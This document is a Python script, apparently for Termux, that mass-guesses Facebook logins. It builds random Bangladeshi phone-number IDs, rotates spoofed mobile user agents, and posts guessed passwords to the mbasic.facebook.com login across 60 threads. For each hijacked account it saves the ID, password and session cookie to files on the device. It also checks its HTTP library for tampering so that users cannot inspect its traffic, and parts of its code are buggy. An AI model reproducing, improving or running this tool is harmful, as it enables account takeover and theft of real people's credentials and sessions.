#GITHUB : SHAJON-404
#TEAM : SHAJON-404

                      # POWER OF SHAJON-404 #

import os
os.system('clear')
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
print('\033[1;32mMODULE INSTALLED.....\n')
os.system('clear')
import os,sys,time,json,random,re,string,platform,base64,uuid
import httpx
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
import requests as req
import datetime
from os import name, path
import zlib
import pip
import platform
import urllib
from weakref import proxy
from urllib.request import parse_http_list
now = datetime.datetime.now()
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    print('𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐌𝐨𝐝𝐮𝐥𝐞......')
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('pip install httpx')

#----------METHOD PROTECTOR---------#
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'sessions.py','r').read():
    pass
else:
    exit('GET OUT BITCH - !')
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'api.py','r').read():
    pass
else:
    exit('\033[1;91mPLEASE TURN OFF YOUR BYPASS SYSTEM KIDZ')
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'models.py','r').read():
    pass
else:
    exit('\033[1;91mPLEASE TURN OFF YOUR LOCAL METHOD CAPTURE SYSTEM KIDZ')

#----------APP CHECKER------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m 🎮 Your  Active   Apps :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ !] %s \x1b[1;95mYour Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
#-------------END------------#
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
url: str = 'https://api.ipify.org'
mahi = req.get(url)
id: str = mahi.text
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
VIOLATE = '\033[1;35m'

#----------USER AGENT-----------#
for sex in range(1000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14','15'])
	c='SM-J320'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e='Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=random.randrange(50,115)
	g='0'
	h=random.randrange(3000,6500)
	i=random.randrange(50,115)
	j='Mobile Safari/537.36'
	sexy=(f'{a} {b}; {c}{d} {e}{f}.{g}.{h}.{i} {j}')
	ugen.append(sexy)
for agent in range(1000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='pt-pt; GT-I9060'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/534.30 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/534.30'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
for xd in range(1000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
#----------USER AGENT END----------#

#---------------END--------------#
logo=("""  \33[1;91m
      
               \33[1;31m╭━━━┳╮╱╭┳━━━╮╱╭┳━━━┳━╮╱╭╮
               \33[1;34m┃╭━╮┃┃╱┃┃╭━╮┃╱┃┃╭━╮┃┃╰╮┃┃
               \33[1;31m┃╰━━┫╰━╯┃┃╱┃┃╱┃┃┃╱┃┃╭╮╰╯┃
               \33[1;31m╰━━╮┃╭━╮┃╰━╯┣╮┃┃┃╱┃┃┃╰╮┃┃
               \33[1;34m┃╰━╯┃┃╱┃┃╭━╮┃╰╯┃╰━╯┃┃╱┃┃┃
               \33[1;31m╰━━━┻╯╱╰┻╯╱╰┻━━┻━━━┻╯╱╰━╯
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m DEVLOPED BY\33[32;m  : SHAJON ツ゚ \033[1;96m 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      : SHAJON ツ \033[1;34m
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m GITHUB       : SHAJON-404 \033[1;35m      
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL STATUS  : FREE\033[1;36m    
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM         : SHAJON-404 \033[1;35m                  
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VERSION : \033[1;36m1.1                   
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]

""") 
#------------COLOUR CODE--------------#
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m' #light blue
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
VIOLATE = '\033[1;35m'
#-----------COLOUR CODE END-----------#
def Shajon(): 
        os.system("clear")
        print(logo)
        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;32m𝙎𝙏𝘼𝙍𝙏 𝘾𝙇𝙊𝙉𝙄𝙉𝙂")
        print(" \033[1;35m[\033[1;32m2\033[1;35m] \033[1;32m𝗝𝗢𝗜𝗡 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗖𝗛𝗔𝗡𝗘𝗟")
        print(" \033[1;35m[\033[1;32m3\033[1;35m] \033[1;32m𝗪𝗔𝗧𝗖𝗛 𝗧𝗨𝗧𝗢𝗥𝗜𝗔𝗟 𝗢𝗻 𝗬𝗼𝘂𝗧𝘂𝗯𝗲")
        print(" \033[1;35m[\033[1;32m0\033[1;35m] \033[1;31m𝐄𝐗𝐈𝐓")
        print("\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        Saba =input("\n\x1b[38;5;155m [➤] \033[1;32m𝐂𝐇𝐎𝐎𝐒𝐄 𝐀 𝐕𝐀𝐋𝐈𝐃 𝐎𝐏𝐓𝐈𝐎𝐍 : \033[1;32m")
        if Saba in ['1']:        	
            shajon()
        if Saba in ['2']:
        	os.system('xdg-open https://t.me/premium_sofware_apps')
        if Saba in ['3']:
            os.system('xdg-open https://youtube.com/@mrlofi404?sub_confirmation=1')
        if Saba in [" 0", "00"]:
            exit()
        else:
            exit()      
def shajon():    
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;91m[\033[1;92m➤\033[1;91m]\033[1;97m 𝙴𝚇𝙰𝙼𝙿𝙻𝙴 •𝙱𝙰𝙽• 𝚂𝙸𝙼 𝙲𝙾𝙳𝙴 \033[1;91m➤ \033[1;32m016•017•018•019•015')
    print('\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
    mahi = input('\033[1;91m[\033[1;92m➤\033[1;91m]\033[1;97m 𝙴𝙽𝚃𝙴𝚁 𝚂𝙸𝙼 𝙲𝙾𝙳𝙴 \033[1;91m➤ \033[1;32m ')
    print('\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
    os.system('clear')
    print(logo)
    ex = ''.join(random.choice(string.digits) for _ in range(2))
    new = ''.join(random.choice(string.digits) for _ in range(2))
    print('\033[1;91m[\033[1;92m➤\033[1;91m]\033[1;97m 𝙴𝚇𝙰𝙼𝙿𝙻𝙴 𝙻𝙸𝙼𝙸𝚃  \033[1;91m➤ \033[1;32m2000➤5000➤10000➤15000➤50000')
    print('\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
    limit = int(input('\033[1;91m[\033[1;92m➤\033[1;91m]\033[1;97m 𝙴𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝙲𝚁𝙰𝙲𝙺 𝙻𝙸𝙼𝙸𝚃 \033[1;91m➤ \033[1;97m '))
    print('\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp) 
    with ThreadPool(max_workers=60) as shajon:
        os.system('clear')
        time.sleep(0.2)
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;155m[➤] 𝚂𝙸𝙼 𝙲𝙾𝙳𝙴   :\033[0;97m '+mahi)
        print("\x1b[38;5;155m[➤] 𝚃𝙾𝙳𝙰𝚈 𝙳𝙰𝚃𝙴 :\033[0;97m"+(now.strftime(' %Y-%m-%d ')))
        print('\x1b[38;5;155m[➤] 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳𝚂  :\033[0;97m '+tl)         
        print("\x1b[38;5;155m[➤] 𝚂𝚃𝙰𝚁𝚃 𝚃𝙸𝙼𝙴 :\033[0;97m"+(now.strftime(' %H:%M')))
        print('\x1b[38;5;155m[➤] 𝚄𝚂𝙴 𝙰𝙸𝚁𝙿𝙻𝙰𝙽𝙴 𝙼𝙾𝙳𝙴 𝙴𝚅𝙴𝚁𝚈 5 𝙼𝙸𝙽𝚄𝚃𝙴𝚂')
        print('\x1b[38;5;155m[➤] \033[1;91m𝙳𝚄𝙴 𝚂𝙴𝚁𝚅𝙴𝚁 𝙿𝚁𝙾𝙱𝙻𝙰𝙼𝙴 𝚂𝙾𝙼𝙴 𝙸𝙳𝚉 𝚆𝙰𝚂 𝙻𝙾𝙲𝙺𝙴𝙳')  
        print("\x1b[38;5;155m════════════════════════════════════════════════════════\n")
        for guru in user:
            uid = mahi+ex+new+guru
            pwx = [mahi+ex+new+guru,new+guru,ex+guru,mahi+ex+new,'bangla','Bangladesh','freefire','sadiya','bangladesh','sabbir','afsana','nusrat','ma baba']
            shajon.submit(rcrack,uid,pwx,tl) 
    print('\n')
    print('\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
    print('\033[1;37m[\033[1;32m~\033[1;37m] 𝙲𝚁𝙰𝙲𝙺 𝙿𝚁𝙾𝙲𝙴𝚂𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙴𝙽𝙳𝙴𝙳🌺🌺')
    print('\033[1;37m[\033[1;32m~\033[1;37m] 𝚃𝙾𝚃𝙰𝙻 𝙰𝙲𝚃𝙸𝚅𝙴 𝙸𝙳𝚂 : \033[0;32m'+str(len(oks)))
    print('\033[1;37m[\033[1;32m~\033[1;37m] 𝚃𝙾𝚃𝙰𝙻 𝙳𝙴𝙰𝚃𝙷 𝙸𝙳𝚂  : \033[0;91m'+str(len(oks)))
    print('\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    global agents
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\x1b[1;5;1m[➤] SHAJON~XD  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ')
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
            "authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2.9000000953674316',
            'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=AfdcaSxzuKqJh7PvEEG78E28_dV40yVXc-iWHtYfDCh9lA_QF8lIH_InMinT8hWqePD5y48UyOJEkmL6dRcE9533Il724FB0r4F_uwUALQMzLg&smuh=44134&lh=Ac839pZdyhBDnMVKasc&wtsid=rdr_06Y4DaAgXf51PZTqn&refid=8&ref_component=mbasic_footer&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '" "',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('')
                print(f"\x1b[1;92m[➤] SHAJON--OK ♥︎ {uid} \x1b[1;94m•\x1b[1;32m {ps} \n\033[1;32m[COOKIE]➤ \033[1;91m {coki} \n  ")
                open('/sdcard/𝚂𝙷𝙰𝙹𝙾𝙽--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a').write(uid+' • '+ps+' • ''[COOKIE]'  +coki+' \n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000"," 10000")[1]
                    uid = "1000","10000"+coki1[0:11]                    
                    print('\r\033[38;5;45m[𝚂𝙷𝙰𝙹𝙾𝙽--𝟸𝙵] '+uid+' [💙] '+ps+' ')
                    open('/sdcard/𝚂𝙷𝙰𝙹𝙾𝙽--𝟸𝙵💙.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]                    
                    print(f'\r\033[1;30m[SHAJON--CP💔] '+uid+' [💔] '+ps+' ')                    
                    open('/sdcard/𝚂𝙷𝙰𝙹𝙾𝙽--𝙲𝙿🥺💔.txt', 'a').write(uid+' | '+ps+'\n')
                    cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

Shajon()


                    #---------THE END---------# 😊🖤